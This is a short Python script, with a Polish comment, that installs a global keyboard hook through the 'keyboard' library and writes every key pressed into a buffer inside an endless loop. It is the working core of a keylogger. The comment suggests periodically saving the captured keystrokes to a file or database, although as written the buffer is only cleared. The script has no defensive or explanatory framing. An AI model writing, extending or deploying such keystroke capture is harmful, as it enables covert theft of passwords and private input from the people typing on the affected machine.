import keyboard
import io

buffer = io.StringIO()

def on_key_press(event):
    key = event.name
    buffer.write(key)

keyboard.on_press(on_key_press)

while True:
    if buffer.tell() > 100:
        # tutaj można co jakiś czas zrobić zapis do pliku, bazy danych itp.
        buffer.seek(0)
        buffer.truncate()
